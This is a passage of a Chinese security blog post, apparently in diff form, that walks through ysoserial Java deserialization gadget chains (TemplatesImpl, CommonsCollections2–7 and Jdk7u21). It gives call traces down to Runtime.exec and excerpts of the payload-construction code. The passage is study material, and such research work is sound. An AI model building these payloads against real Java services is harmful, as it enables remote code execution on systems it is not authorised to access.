+<p>来到<code>getTransletInstance</code>方法中，可以看到有个<code>defineTransletClasses()</code>和<code>Class.newInstance()</code>的操作<br><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20200206224301.png" alt><br><code>defineTransletClasses</code>方法中可以看到，将<code>_bytes</code>字节码信息生成类信息，保存在<code>_class</code>中<br><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20200206224436.png" alt><br>然后在<code>getTransletInstance</code>的方法中实例化了这个<code>_class</code>中的类<br>所以我们只要生成一个类，并在构造函数中调用命令执行函数即可。<br>ysoserial中用到了javassist来进行字节码操作，在初始化函数后面添加了命令执行的函数。<br><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20200206225119.png" alt><br>至于为什么生成的类是一个继承了<code>AbstractTranslet</code>抽象类的类，我想可能是跟<code>getTransletInstance</code>中生成的类加载器有关，这里的类加载器是<code>TransletClassLoader</code><br><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20200206225345.png" alt><br>最后，由于<code>getTransletInstance</code>是个私有方法，既然是私有，则一定有调用的地方，就是在<code>newTransformer</code>方法中<br><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20200206225602.png" alt><br>到这里，一个invoke方法完成命令执行的gadget也就分析完了。这个template gadget在ysoserial中用的还是蛮多的，<del>由于是位于rt.jar中的类</del>,<br><del>貌似jdk8之后从rt.jar中分离出来变成了xalan.jar</del> 应该是分离出来的包名为<code>org.apache.xalan.xsltc</code>,原生的是<code>com.sun.org.apache.xalan.internal.xsltc</code>这点从<code>Gadget.createTemplatesImpl</code>中应该可以看出<br>也算是一种单次invoke执行系统命令比较好的一个通用解。<br>触发流程如下<br><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl.<span class="keyword">new</span><span class="type">Transformer</span>()</span><br><span class="line">    TemplatesImpl.getTransletInstance()</span><br><span class="line">        Class.<span class="keyword">new</span><span class="type">Instance</span>() <span class="comment">// 执行任意字节码的初始化方法</span></span><br></pre></td></tr></table></figure></p>
+<p>前面<code>java.util.PriorityQueue</code>的部分没有太多好分析的，最多可能调用栈会稍微深一点<br>但有一个需要稍微注意一下的是在设置queue的时候，设置了两份数据，虽然只有第一份是payload，但是去除第二份之后会使得逻辑走不到后面的部分。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> PriorityQueue&lt;Object&gt;(<span class="number">2</span>,<span class="keyword">new</span> TransformingComparator(transformer));</span><br><span class="line"><span class="comment">// stub data for replacement later</span></span><br><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, <span class="string">"queue"</span>);</span><br><span class="line">queueArray[<span class="number">0</span>] = templates;</span><br><span class="line">queueArray[<span class="number">1</span>] = <span class="number">1</span>;</span><br></pre></td></tr></table></figure></p>
+<p>可以来稍微看一下调用过程<br>最开始是<code>PriorityQueue</code>的readObject部分，调用了<code>heapify</code>方法<br><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20200206230558.png" alt><br><code>heapify</code>中遍历queue调用<code>siftDown</code>（heapify中的 ((size &gt;&gt;&gt; 1) - 1)也就是为什么要多加一个数据的原因 ）<br><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20200206230813.png" alt><br><code>siftDown</code>跟到<code>siftDownUsingComparator</code><br><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20200206230900.png" alt><br><code>siftDownUsingComparator</code>中触发了成员变量<code>comparator.compare</code>方法<br><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20200206231026.png" alt><br>之后的逻辑就可以和<code>TransformingComparator.compare</code>调用<code>InvokerTransformer.transform</code>最后通过template gadget命令执行的逻辑串起来了，就是一条完整的反序列化gadget。</p>
+<p>完善一下之前的gadget信息就是<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">ObjectInputStream</span><span class="selector-class">.readObject</span>()</span><br><span class="line">	<span class="selector-tag">PriorityQueue</span><span class="selector-class">.readObject</span>()</span><br><span class="line">		...</span><br><span class="line">			<span class="selector-tag">TransformingComparator</span><span class="selector-class">.compare</span>()</span><br><span class="line">				<span class="selector-tag">InvokerTransformer</span><span class="selector-class">.transform</span>()</span><br><span class="line">				    <span class="selector-tag">TemplatesImpl</span><span class="selector-class">.newInstance</span>()</span><br><span class="line">				        ... <span class="selector-tag">template</span> <span class="selector-tag">gadget</span></span><br></pre></td></tr></table></figure></p>
+<h1 id="CommonsCollections3"><a href="#CommonsCollections3" class="headerlink" title="CommonsCollections3"></a>CommonsCollections3</h1><p>基于3.1的版本<code>@Dependencies({&quot;commons-collections:commons-collections:3.1&quot;})</code><br>没给出gadget的信息，但是明显可以看到和CommonsCollections1的内容几乎大体一致<br>主要是<code>transformers</code>数组的部分改了下<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Object templatesImpl = Gadgets.createTemplatesImpl(command);</span><br><span class="line"></span><br><span class="line"><span class="comment">// real chain for after setup</span></span><br><span class="line"><span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">		<span class="keyword">new</span> ConstantTransformer(TrAXFilter<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line"><span class="class">		<span class="title">new</span> <span class="title">InstantiateTransformer</span>(</span></span><br><span class="line">				new Class[] &#123; Templates.class &#125;,</span><br><span class="line">				<span class="keyword">new</span> Object[] &#123; templatesImpl &#125; )&#125;;</span><br></pre></td></tr></table></figure></p>
+<p>来关注下新出现的两个类<code>InstantiateTransformer</code>和<code>TrAXFilter</code><br>在<code>InstantiateTransformer</code>的<code>transform</code>方法中可以看到，这里是进行动态实例化<br><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20200206234610.png" alt><br>然后是<code>TrAXFilter</code>的构造函数，对传入的templates调用<code>newTransformer</code><br><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20200206234738.png" alt><br>这样的话就可以和之前的template gadget串起来了，在调用<code>newTransformer</code>时从字节码中加载类，然后运行构造方法，从而执行危险函数。</p>
+<p>至于前面readObject的调用还是用的<code>AnnotationInvocationHandler</code>到动态代理然后LazyMap。<br>整体的调用流程:<br><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">ObjectInputStream</span><span class="selector-class">.readObject</span>()</span><br><span class="line">	<span class="selector-tag">AnnotationInvocationHandler</span><span class="selector-class">.readObject</span>()</span><br><span class="line">		<span class="selector-tag">Map</span>(Proxy)<span class="selector-class">.entrySet</span>()</span><br><span class="line">			<span class="selector-tag">AnnotationInvocationHandler</span><span class="selector-class">.invoke</span>()</span><br><span class="line">				<span class="selector-tag">LazyMap</span><span class="selector-class">.get</span>()</span><br><span class="line">					<span class="selector-tag">ChainedTransformer</span><span class="selector-class">.transform</span>()</span><br><span class="line">						<span class="selector-tag">ConstantTransformer</span><span class="selector-class">.transform</span>()</span><br><span class="line">						<span class="selector-tag">InstantiateTransformer</span><span class="selector-class">.transform</span>()</span><br><span class="line">							<span class="selector-tag">new</span> <span class="selector-tag">TrAXFilter</span>()</span><br><span class="line">							    <span class="selector-tag">TemplatesImpl</span><span class="selector-class">.newInstance</span>()</span><br><span class="line">							        ... <span class="selector-tag">template</span> <span class="selector-tag">gadget</span></span><br></pre></td></tr></table></figure></p>
+<h1 id="CommonsCollections4"><a href="#CommonsCollections4" class="headerlink" title="CommonsCollections4"></a>CommonsCollections4</h1><p>基于4.0的版本<code>@Dependencies({&quot;org.apache.commons:commons-collections4:4.0&quot;})</code><br>注释里有一句话</p>
+<blockquote>
+<p>Variation on CommonsCollections2 that uses InstantiateTransformer instead of InvokerTransformer.</p>
+</blockquote>
+<p>用<code>InstantiateTransformer</code>代替了CommonsCollections4中的<code>InvokerTransformer</code><br>这样触发链就变成了<br><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">ObjectInputStream</span><span class="selector-class">.readObject</span>()</span><br><span class="line">	<span class="selector-tag">PriorityQueue</span><span class="selector-class">.readObject</span>()</span><br><span class="line">		...</span><br><span class="line">			<span class="selector-tag">TransformingComparator</span><span class="selector-class">.compare</span>()</span><br><span class="line">				<span class="selector-tag">InstantiateTransformer</span><span class="selector-class">.transform</span>()</span><br><span class="line">					<span class="selector-tag">new</span> <span class="selector-tag">TrAXFilter</span>()</span><br><span class="line">					    <span class="selector-tag">TemplatesImpl</span><span class="selector-class">.newInstance</span>()</span><br><span class="line">					        ... <span class="selector-tag">template</span> <span class="selector-tag">gadget</span></span><br></pre></td></tr></table></figure></p>
+<h1 id="CommonsCollections5"><a href="#CommonsCollections5" class="headerlink" title="CommonsCollections5"></a>CommonsCollections5</h1><p>基于3.1的版本<code>@Dependencies({&quot;commons-collections:commons-collections:3.1&quot;})</code><br>之前CommonsCollections1的时候有一个疑问，就是为什么不直接找一个在readObject时能触发get方法的类。<br>这回的gadget也正是解决了这个问题，至于后面LazyMap的调用还是和之前一致。<br>来看一下给出的gadget信息<br><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">    BadAttributeValueExpException.readObject()</span><br><span class="line">        TiedMapEntry.toString()</span><br><span class="line">            LazyMap.get()</span><br><span class="line">                ChainedTransformer.transform()</span><br><span class="line">                    ConstantTransformer.transform()</span><br><span class="line">                    InvokerTransformer.transform()</span><br><span class="line">                        <span class="function"><span class="keyword">Method</span>.<span class="title">invoke</span><span class="params">()</span></span></span><br><span class="line"><span class="function">                            <span class="title">Class</span>.<span class="title">getMethod</span><span class="params">()</span></span></span><br><span class="line"><span class="function">                    <span class="title">InvokerTransformer</span>.<span class="title">transform</span><span class="params">()</span></span></span><br><span class="line"><span class="function">                        <span class="title">Method</span>.<span class="title">invoke</span><span class="params">()</span></span></span><br><span class="line"><span class="function">                            <span class="title">Runtime</span>.<span class="title">getRuntime</span><span class="params">()</span></span></span><br><span class="line"><span class="function">                    <span class="title">InvokerTransformer</span>.<span class="title">transform</span><span class="params">()</span></span></span><br><span class="line"><span class="function">                        <span class="title">Method</span>.<span class="title">invoke</span><span class="params">()</span></span></span><br><span class="line"><span class="function">                            <span class="title">Runtime</span>.<span class="title">exec</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure></p>
+<p>可以看到这回的调用相对于之前的其实思路会更清晰，没有了动态代理之类的操作，调用逻辑更加直接。<br>来看到<code>BadAttributeValueExpException</code>的readObject方法<br>从字节流中读取val字段，然后调用toString方法。（但其实这里时有前提的，就是<code>System.getSecurityManager() == null</code>，也就是没有设置SecurityManager）<br><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20200208135250.png" alt><br>然后调用到<code>TiedMapEntity</code>的toString方法,并且在调用getValue时触发了<code>Map.get</code><br><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20200208135447.png" alt><br><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20200208135459.png" alt><br>从而连接到LazyMap那条gadget</p>
+<p>注释里还有条信息就是，也就是我们之前看到的if条件中，在jdk 8u76之后，需要没有设置security manager才能触发这条gadget。</p>
+<blockquote>
+<p>This only works in JDK 8u76 and WITHOUT a security manager<br><a href="https://github.com/JetBrains/jdk8u_jdk/commit/af2361ee2878302012214299036b3a8b4ed36974#diff-f89b1641c408b60efe29ee513b3d22ffR70" target="_blank" rel="noopener">https://github.com/JetBrains/jdk8u_jdk/commit/af2361ee2878302012214299036b3a8b4ed36974#diff-f89b1641c408b60efe29ee513b3d22ffR70</a></p>
+</blockquote>
+<h1 id="CommonsCollections6"><a href="#CommonsCollections6" class="headerlink" title="CommonsCollections6"></a>CommonsCollections6</h1><p>基于3.1的版本<code>@Dependencies({&quot;commons-collections:commons-collections:3.1&quot;})</code><br>来看下gadget的信息（优化了下）<br><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">    HashSet.readObject()</span><br><span class="line">        HashMap.put()</span><br><span class="line">        HashMap.hash()</span><br><span class="line">            TiedMapEntry.hashCode()</span><br><span class="line">            TiedMapEntry.getValue()</span><br><span class="line">                LazyMap.get()</span><br><span class="line">                    ChainedTransformer.transform()</span><br><span class="line">                    InvokerTransformer.transform()</span><br><span class="line">                        <span class="function"><span class="keyword">Method</span>.<span class="title">invoke</span><span class="params">()</span></span></span><br><span class="line"><span class="function">                            <span class="title">Class</span>.<span class="title">getMethod</span><span class="params">()</span></span></span><br><span class="line"><span class="function">                    <span class="title">InvokerTransformer</span>.<span class="title">transform</span><span class="params">()</span></span></span><br><span class="line"><span class="function">                        <span class="title">Method</span>.<span class="title">invoke</span><span class="params">()</span></span></span><br><span class="line"><span class="function">                            <span class="title">Runtime</span>.<span class="title">getRuntime</span><span class="params">()</span></span></span><br><span class="line"><span class="function">                    <span class="title">InvokerTransformer</span>.<span class="title">transform</span><span class="params">()</span></span></span><br><span class="line"><span class="function">                        <span class="title">Method</span>.<span class="title">invoke</span><span class="params">()</span></span></span><br><span class="line"><span class="function">                            <span class="title">Runtime</span>.<span class="title">exec</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure></p>
+<p>可以看到后面LazyMap的调用也是我们熟悉的，所以还是相当于找了个从readObject-&gt;Map.get的调用链<br>先来看到<code>HashSet.readObject()</code><br>可以看到这里创建了个HashMap之后做了put的操作<br><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20200208141100.png" alt><br>put操作则会对key值进行hash，进而调用hashCode方法<br><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20200208141138.png" alt><br><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20200208141209.png" alt><br>TiedMapEntry的hashCode会进而调用到getValue方法，从而执行Map.get<br><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20200208141335.png" alt><br><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20200208141347.png" alt></p>
+<h1 id="CommonsCollections7"><a href="#CommonsCollections7" class="headerlink" title="CommonsCollections7"></a>CommonsCollections7</h1><p>基于3.1的版本<code>@Dependencies({&quot;commons-collections:commons-collections:3.1&quot;})</code><br>来看下gadget的信息（优化后）<br><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Hashtable.readObject()</span><br><span class="line">    Hashtable.reconstitutionPut()</span><br><span class="line">        AbstractMapDecorator.equals()</span><br><span class="line">            AbstractMap.equals()</span><br><span class="line">                LazyMap.get()</span><br><span class="line">                    ChainedTransformer.transform()</span><br><span class="line">                    InvokerTransformer.transform()</span><br><span class="line">                        <span class="function"><span class="keyword">Method</span>.<span class="title">invoke</span><span class="params">()</span></span></span><br><span class="line"><span class="function">                            <span class="title">Class</span>.<span class="title">getMethod</span><span class="params">()</span></span></span><br><span class="line"><span class="function">                    <span class="title">InvokerTransformer</span>.<span class="title">transform</span><span class="params">()</span></span></span><br><span class="line"><span class="function">                        <span class="title">Method</span>.<span class="title">invoke</span><span class="params">()</span></span></span><br><span class="line"><span class="function">                            <span class="title">Runtime</span>.<span class="title">getRuntime</span><span class="params">()</span></span></span><br><span class="line"><span class="function">                    <span class="title">InvokerTransformer</span>.<span class="title">transform</span><span class="params">()</span></span></span><br><span class="line"><span class="function">                        <span class="title">Method</span>.<span class="title">invoke</span><span class="params">()</span></span></span><br><span class="line"><span class="function">                            <span class="title">Runtime</span>.<span class="title">exec</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure></p>
+<p>还是和之前一样，找了个另外的方式来触发Map.get</p>
+<p>在HashTable的readObject方法中调用了<code>reconstitutionPut</code>，这里对table中key进行了equals的比较<br><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20200208143237.png" alt><br>于是触发到<code>AbstractMap</code>的equals方法，这里则会触发Map.get<br><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20200208143552.png" alt><br>于是和前面一样，将LazyMap.get的链连接起来即可。</p>
+<p>看了下面这篇文章之后，发现实际构造时，有两个特别有意思的点之前没关注到。<br><a href="http://blog.0kami.cn/2019/10/31/study-java-deserialized-commonscollections3-others/" target="_blank" rel="noopener">http://blog.0kami.cn/2019/10/31/study-java-deserialized-commonscollections3-others/</a><br>1、HashTable的哈希冲突<br>可以看到在进入<code>e.key.equals(key)</code>前会有个短路条件<code>e.hash == hash</code><br><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20200208144952.png" alt><br>就是说table中存在hash相同的key值，这也是ysoserial在构造的时候一个巧妙的地方<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject</span></span><br><span class="line">Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);</span><br><span class="line">lazyMap1.put(<span class="string">"yy"</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);</span><br><span class="line">lazyMap2.put(<span class="string">"zZ"</span>, <span class="number">1</span>);</span><br></pre></td></tr></table></figure></p>
+<p>我们实际打印下”yy”和”zZ”的hashCode之后会发现哈希值是一样的，但是equals的判断逻辑中比较的并不是hashCode，而且另外的判断逻辑。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(<span class="string">"yy"</span>.hashCode()); <span class="comment">// 3872</span></span><br><span class="line">System.out.println(<span class="string">"zZ"</span>.hashCode()); <span class="comment">// 3872</span></span><br><span class="line">System.out.println(<span class="string">"yy"</span>.equals(<span class="string">"zZ"</span>)); <span class="comment">// false</span></span><br></pre></td></tr></table></figure></p>
+<p>这样只有当table中存在hash相同的key值时，才会进入到<code>e.key.equals</code>的逻辑中</p>
+<p>2、删除自动生成的key/value<br>这里我的观念与参考文章的部分不同。<br>由于hashtable有两次put的操作，在第二次<code>hashtable.put(lazyMap2, 2);</code>时，会触发LazyMap的get方法，会新增一个key/value值相同的键值对。<br><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20200208160534.png" alt><br>这样在<code>AbstractMap.equals()</code>的逻辑中，由于两个map的长度不一致，直接返回false，不会进入到后面Map.get的逻辑当中<br><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20200208160743.png" alt><br>所以在payload中会有remove的操作，就是删掉自动生成的”yy”键值对。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lazyMap2.remove(<span class="string">"yy"</span>);</span><br></pre></td></tr></table></figure></p>
+<h1 id="Jdk7u21"><a href="#Jdk7u21" class="headerlink" title="Jdk7u21"></a>Jdk7u21</h1><p>唯一一个仅依赖rt.jar的gadget，只可惜版本限制太低，应该已经没什么人用jdk 7u21了吧。<br>有了前面的动态代理、template gadget的基础之后，这里的gadget理解起来也就轻松了很多。</p>
+<p>个人感觉这回给出的gadget信息有点凌乱，不如直接来看触发的堆栈。<br>最开始的触发逻辑是HashSet.readObject和之前一样，进入了Map.put（但是这回map是个LinkedHashMap实例）<br>HashSet的内部由一个HashMap维护，这回gadget反序列化的是一个LinkedHashSet，内部则是LinkedHashMap<br><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20200208185648.png" alt><br>然后进入到HashMap的put逻辑当中（感觉这个逻辑很熟悉就是之前CommonsCollection7中HashTable的put逻辑，但有一点点小差异）<br><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20200208190001.png" alt><br>这回我们还是要和之前类似，触发到<code>key.equals</code>逻辑，简化之后这里的条件是</p>
+<ul>
+<li><code>e.hash == hash(key)</code> true</li>
+<li><code>e.key == key</code> false<br>e就是当前map中的entry，key则是当前要put的值(value其实是没什么意义的)<br>第二个条件比较容易成立，只要当前map中的key没有和要put的key相同即可（也就是指LinkedHashSet两次put的值不一致）<br>第一个条件就是这个payload比较有意思的地方了，只能默默喊一声nb<br>我们可以看下hashCode的具体实现<br>由于<code>useAltHashing</code>默认为false，所以hash的值仅与<code>k.hashCode()</code>的结果有关<br><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20200208190755.png" alt><br>这里的k我们设置的是一个被<code>AnnotationInvocationHandler</code>动态代理了的HashMap<br>这样hashCode的逻辑就会动态代理到invoke的逻辑中<br>invoke中当触发到<code>hashCode</code>时，会到<code>hashCodeImpl</code>方法中处理<br><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20200208191258.png" alt></li>
+</ul>
+<p><code>this.memberValues</code>就是被我们动态代理的HashMap,所以<code>var2</code>就是每个entry<br>对于单个键值对的HashMap来说，hashCode值就是<code>127 * key.hashCode() ^ memberValueHashCode(value);</code><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">hashCodeImpl</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> var1 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        Entry var3;</span><br><span class="line">        Iterator var2 = <span class="keyword">this</span>.memberValues.entrySet().iterator();</span><br><span class="line">        <span class="keyword">for</span>( ;var2.hasNext(); ) &#123;</span><br><span class="line">            var3 = (Entry)var2.next();</span><br><span class="line">            String key = var3.getKey();</span><br><span class="line">            Object value = var3.getValue();</span><br><span class="line">            var1 += <span class="number">127</span> * </span><br><span class="line">                key.hashCode() ^          </span><br><span class="line">                memberValueHashCode(value); </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> var1;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
+<p>由于任何一个数与0异或都是本身，所以我们可以在前面的LinkedHashSet中put这样一个HashMap</p>
+<ul>
+<li><code>HashMap.key.HashCode == 0</code></li>
+<li><code>LinkedHashSet.contains(HashMap.value) == false</code><br>关于<code>HashCode==0</code>的字符串，网上就有不少<a href="https://stackoverflow.com/questions/18746394/can-a-non-empty-string-have-a-hashcode-of-zero" target="_blank" rel="noopener">https://stackoverflow.com/questions/18746394/can-a-non-empty-string-have-a-hashcode-of-zero</a><br>比如ysoserial中用的就是<code>String zeroHashCodeStr = &quot;f5a5a608&quot;;</code><br>到这里就可以成功解决了<code>e.hash == hash</code>的问题，从而可以进入到<code>key.equals(k)</code>的逻辑中<br>由于key是个被<code>AnnotationInvocationHandler</code>动态代理了的HashMap,所以也会走到invoke逻辑中，进而走到<code>equalsImpl</code><br>需要留意一下这里传入的<code>var3[0]</code>，也就是之前的k,就是LinkedHashSet中已经存在了值<br><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20200208193632.png" alt><br>然后在<code>equalsImpl</code>函数中获取所有接口的方法，通过invoke动态调用<br>所以只要将一开始存在LinkedHashMap中的key设置为<code>TemplatesImpl</code>,就可以动态调用到<code>TemplatesImpl</code>的<code>getOutputProperties</code>方法<br><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20200208194117.png" alt><br><code>getOutputProperties</code>之后就是之前的template的gadget了。调用到<code>newTransformer()</code>，然后加载恶意字节码即可。<br><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20200208194427.png" alt></li>
+</ul>
+<p>ysoserial中的payload<br>可以看到和之前分析的一致，HashSet中第一次add了被<code>AnnotationInvocationHandler</code>动态代理的<code>TemplatesImpl</code>实例类<br>第二次add的则是被动态代理的HashMap,格式为<code>{zeroHashCodeStr -&gt; templates}</code> (两次put可能是为了保证一些属性不被更改)<br>可以注意到的是这回特地设置了<code>type</code>属性为<code>Templates.class</code>，就是为了在<code>equalsImpl</code>中触发<code>Templates</code>接口的方法<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> Object templates = Gadgets.createTemplatesImpl(command);</span><br><span class="line"></span><br><span class="line">String zeroHashCodeStr = <span class="string">"f5a5a608"</span>;</span><br><span class="line"></span><br><span class="line">HashMap map = <span class="keyword">new</span> HashMap();</span><br><span class="line">map.put(zeroHashCodeStr, <span class="string">"foo"</span>);</span><br><span class="line"></span><br><span class="line">InvocationHandler tempHandler = (InvocationHandler) Reflections.getFirstCtor(Gadgets.ANN_INV_HANDLER_CLASS).newInstance(Override<span class="class">.<span class="keyword">class</span>, <span class="title">map</span>)</span>;</span><br><span class="line">Reflections.setFieldValue(tempHandler, <span class="string">"type"</span>, Templates<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">Templates proxy = Gadgets.createProxy(tempHandler, Templates<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line">LinkedHashSet set = <span class="keyword">new</span> LinkedHashSet(); <span class="comment">// maintain order</span></span><br><span class="line">set.add(templates);</span><br><span class="line">set.add(proxy);</span><br><span class="line"></span><br><span class="line">Reflections.setFieldValue(templates, <span class="string">"_auxClasses"</span>, <span class="keyword">null</span>);</span><br><span class="line">Reflections.setFieldValue(templates, <span class="string">"_class"</span>, <span class="keyword">null</span>);</span><br><span class="line">map.put(zeroHashCodeStr, templates); <span class="comment">// swap in real object</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> set;</span><br></pre></td></tr></table></figure></p>
+<p>最后按照分析的逻辑来梳理一遍gadget<br><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">LinkedHashSet.readObject<span class="params">()</span></span><br><span class="line">    HashMap.put<span class="params">()</span> <span class="string">//</span> put &#123;templates, object<span class="params">()</span>&#125;</span><br><span class="line">        <span class="string">...</span> </span><br><span class="line">    HashMap.put<span class="params">()</span> <span class="string">//</span> put &#123;<span class="params">(Proxy)</span>HashMap&#123;zeroHashCodeStr -&gt; templates&#125;, object<span class="params">()</span> &#125;</span><br><span class="line">        e.hash == hash<span class="params">(key)</span> <span class="string">//</span> <span class="params">(第一次put的template)</span><span class="string">.hashCode</span><span class="params">()</span> == 17 * zeroHashCodeStr.hashCode ^ <span 